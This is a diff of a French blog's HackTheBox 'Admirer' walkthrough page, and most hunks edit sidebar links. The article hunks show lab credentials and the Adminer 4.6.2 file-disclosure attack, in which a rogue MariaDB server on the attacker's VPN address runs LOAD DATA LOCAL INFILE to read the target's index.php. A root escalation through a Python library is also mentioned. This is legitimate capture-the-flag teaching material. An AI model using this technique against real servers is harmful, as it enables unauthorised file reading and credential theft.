@@ -24,7 +24,7 @@
         "datePublished": "2020-07-30 00:00:00 \x2b0000 UTC",
         "dateModified" : "2020-07-30 00:00:00 \x2b0000 UTC",
         "url" : "\/blog-fr\/hackthebox\/admirer\/",
-        "wordCount" : "749",
+        "wordCount" : "828",
         "keywords" : [ "Blog" ]
     }
     </script>
@@ -67,7 +67,7 @@
 <meta itemprop="description" content="HackTheBox - Admirer">
 <meta itemprop="datePublished" content="2020-07-30T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-07-30T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="749">
+<meta itemprop="wordCount" content="828">
 
 
 
@@ -297,6 +297,42 @@ function setTheme(mode) {
                 
                         <article class="mini-post">
                             <header>
+                                <h3><a href="/blog-en/vulnhub/y0usef/">🇬🇧 Vulnhub writeup : y0usef 1</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2021-02-25'>
+                                    February 25, 2021</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-en/vulnhub/y0usef/" class="image featured">
+            <img src="/img//vulnhub/banner.gif" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
                                 <h3><a href="/blog-en/vulnhub/bellatrix/">🇬🇧 Vulnhub writeup : Bellatrix</a></h3>
                                 
                                 <time class="published" datetime=
@@ -324,7 +360,7 @@ function setTheme(mode) {
         
 
         <a href="/blog-en/vulnhub/bellatrix/" class="image featured">
-            <img src="/img//vulnhub/bellatrix/banner.gif" alt="">
+            <img src="/img//vulnhub/banner.gif" alt="">
         </a>
     
 
@@ -469,42 +505,6 @@ function setTheme(mode) {
 
         <a href="/blog-fr/binary/5-ret2win/" class="image featured">
             <img src="/img//binary/5-ret2win-binary.png" alt="">
-        </a>
-    
-
-
-                        </article>
-                
-                        <article class="mini-post">
-                            <header>
-                                <h3><a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a></h3>
-                                
-                                <time class="published" datetime=
-                                    '2020-09-14'>
-                                    September 14, 2020</time>
-                            </header>
-                            
-    
-
-    
-        
-        
-
-
-
-
-
-
-
-  
-
-
-        
-        
-        
-
-        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
-            <img src="/img//arch/arch-post/arch-banner.png" alt="">
         </a>
     
 
@@ -766,23 +766,23 @@ w0rdpr3ss01!
 <p>On extrait le fichier <code>tar.gz</code> qui contient le code source du site web.</p>
 <p><img src="/img/writeup/admirer/zip.png" alt="zip"></p>
 <p>Le dossier <code>w4ld0s_s3cr3t_d1r</code> me tape dans l&rsquo;oeil.</p>
-<pre><code class="language-bash/shell" data-lang="bash/shell">html/w4ld0s_s3cr3t_d1r ヤマト» cat credentials.txt 
-[Bank Account]
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">html/w4ld0s_s3cr3t_d1r ヤマト» cat credentials.txt 
+<span style="color:#f92672">[</span>Bank Account<span style="color:#f92672">]</span>
 waldo.11
-Ezy]m27}OREc$
+Ezy<span style="color:#f92672">]</span>m27<span style="color:#f92672">}</span>OREc$
 
-[Internal mail account]
+<span style="color:#f92672">[</span>Internal mail account<span style="color:#f92672">]</span>
 w.cooper@admirer.htb
-fgJr6q#S\W:$P
+fgJr6q#S<span style="color:#ae81ff">\W</span>:$P
 
-[FTP account]
+<span style="color:#f92672">[</span>FTP account<span style="color:#f92672">]</span>
 ftpuser
-%n?4Wz}R$tTF7
+%n?4Wz<span style="color:#f92672">}</span>R$tTF7
 
-[Wordpress account]
+<span style="color:#f92672">[</span>Wordpress account<span style="color:#f92672">]</span>
 admin
 w0rdpr3ss01!
-</code></pre><p>Il y a un compte en plus.</p>
+</code></pre></div><p>On peut remarquer un compte en plus contrairement à l&rsquo;autre fichier.</p>
 <p>Dans le fichier <code>index.php</code> on peut aussi trouvé des creds :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $servername = &#34;localhost&#34;;
  $username = &#34;waldo&#34;;
@@ -792,7 +792,9 @@ w0rdpr3ss01!
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $servername = &#34;localhost&#34;;
  $username = &#34;waldo&#34;;
  $password = &#34;Wh3r3_1s_w4ld0?&#34;;
-</code></pre></div><p>On peut voir un dossier <code>utility_scripts</code>.</p>
+</code></pre></div><p>Ca commence à faire beaucoup de comptes et de mots de passe là !</p>
+<p><img src="/img/emoji/panik.png" alt="panic"></p>
+<p>On peut voir un dossier <code>utility_scripts</code>.</p>
 <p><img src="/img/writeup/admirer/admin_tasks.png" alt="task"></p>
 <p>Pendant ce temps là, dirb a trouvé <code>adminer.php</code>.</p>
 <p><img src="/img/writeup/admirer/adminer.png" alt="adminer"></p>
@@ -802,7 +804,9 @@ w0rdpr3ss01!
 <h2 id="pause">Pause</h2>
 <p>Après une petite pause, je decide de trouver des exploit pour adminer 4.6.2.</p>
 <p>Et j&rsquo;en trouve un ici : <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">adminer-4.6.2-file-disclosure-vulnerability</a></p>
-<p>Donc il y a moyen de recuperer les passwords en utilisant un autre server mysql.</p>
+<p>Donc il y a moyen de recuperer les passwords en utilisant un autre server mysql.<br>
+Pour faire simple on va créer un mini serveur mysql sur notre machine qui aura l&rsquo;ip de notre VPN HTB.<br>
+Une fois le serveur en place on va &ldquo;transferer&rdquo; notre compte mysql dans le serveur de la machine et ainsi se connecter avec ce compte.</p>
 <pre><code class="language-bash/shell" data-lang="bash/shell">sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
 # Modification de l'adresse ip
 bind-address = 10.10.14.28
@@ -819,14 +823,15 @@ MariaDB [(none)]&gt; GRANT ALL ON adminer_yamato.* TO yamato@'10.10.10.187' IDEN
 </code></pre><p><img src="/img/writeup/admirer/adminer_3.png" alt="adminer_3"></p>
 <p>Nous voila connecté avec le compte yamato !</p>
 <p><img src="/img/writeup/admirer/adminer_4.png" alt="adminer_4"></p>
-<p>Création d&rsquo;un TABLE</p>
+<p>Création d&rsquo;une TABLE</p>
 <p><img src="/img/writeup/admirer/adminer_5.png" alt="adminer_5"></p>
 <p>Execution de notre exploit en SQL :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">LOAD</span> <span style="color:#66d9ef">DATA</span> <span style="color:#66d9ef">LOCAL</span> INFILE <span style="color:#e6db74">&#39;/var/www/html/index.php&#39;</span>
 <span style="color:#66d9ef">INTO</span> <span style="color:#66d9ef">TABLE</span> exploit
 FIELDS TERMINATED <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#39;\n&#39;</span>
-</code></pre></div><p>Cet exploit va ecrire le fichier index.php dans notre TABLE.<br>
-Malheureusement avec <code>\n</code> certaines lignes ne sont pas prise en compte, don celle qui contient le mot de passe.</p>
+</code></pre></div><p>Cet exploit va ecrire le fichier index.php dans notre TABLE exploit.<br>
+Malheureusement avec <code>\n</code> certaines lignes sont supprimées et comme par hasard il s&rsquo;agit de la ligne qui contient le mot de passe.</p>
+<p><img src="/img/emoji/cry.png" alt="cry"></p>
 <p>On change légèrement notre exploit :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">LOAD</span> <span style="color:#66d9ef">DATA</span> <span style="color:#66d9ef">LOCAL</span> INFILE <span style="color:#e6db74">&#39;/var/www/html/index.php&#39;</span>
 <span style="color:#66d9ef">INTO</span> <span style="color:#66d9ef">TABLE</span> exploit
@@ -837,6 +842,7 @@ FIELDS TERMINATED <span style="color:#66d9ef">BY</span> <span style="color:#e6db
 <h2 id="ssh">SSH</h2>
 <p>Le mot de passe fonctionne, nous voila avec un compte user.<br>
 <img src="/img/writeup/admirer/ssh.png" alt="ssh"></p>
+<p><img src="/img/emoji/eliot-yeah.png" alt="yeah"></p>
 <h2 id="root">ROOT</h2>
 <p>Maintenant, il nous faut le flag root.</p>
 <p>On regarde les droits sudo.<br>
@@ -868,6 +874,7 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
 <p>BOUM</p>
 <p>On a une connexion.</p>
 <p><img src="/img/writeup/admirer/id.png" alt="id"></p>
+<p>Une box très intéressante j&rsquo;ai pu apprendre pas mal de choses !</p>
 
   </div>
 
@@ -1047,6 +1054,44 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
           <article class="mini-post">
             <header>
               <h3>
+                <a href="/blog-en/vulnhub/y0usef/">🇬🇧 Vulnhub writeup : y0usef 1</a>
+              </h3>
+              
+              <time class="published" datetime='2021-02-25'>
+                February 25, 2021
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-en/vulnhub/y0usef/" class="image featured">
+            <img src="/img//vulnhub/banner.gif" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
                 <a href="/blog-en/vulnhub/bellatrix/">🇬🇧 Vulnhub writeup : Bellatrix</a>
               </h3>
               
@@ -1075,7 +1120,7 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
         
 
         <a href="/blog-en/vulnhub/bellatrix/" class="image featured">
-            <img src="/img//vulnhub/bellatrix/banner.gif" alt="">
+            <img src="/img//vulnhub/banner.gif" alt="">
         </a>
     
 
@@ -1234,44 +1279,6 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
 
           </article>
         
-          <article class="mini-post">
-            <header>
-              <h3>
-                <a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a>
-              </h3>
-              
-              <time class="published" datetime='2020-09-14'>
-                September 14, 2020
-              </time>
-            </header>
-            
-    
-
-    
-        
-        
-
-
-
-
-
-
-
-  
-
-
-        
-        
-        
-
-        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
-            <img src="/img//arch/arch-post/arch-banner.png" alt="">
-        </a>
-    
-
-
-          </article>
-        
       </div>
 
       
@@ -1414,6 +1421,17 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
           <article>
             <header>
               
+                <a href="/categories/vulnhub/">vulnhub</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
                 <a href="/categories/android/">android</a>
                 <span style="float:right;">1</span>
               
@@ -1448,17 +1466,6 @@ waldo@admirer:~/yamato$ chmod +x shutil.py
             <header>
               
                 <a href="/categories/s%C3%A9curit%C3%A9/">sécurité</a>
-                <span style="float:right;">1</span>
-              
-            </header>
-          </article>
-        </p>
-        
-        <p>
-          <article>
-            <header>
-              
-                <a href="/categories/vulnhub/">vulnhub</a>
                 <span style="float:right;">1</span>
               
             </header>
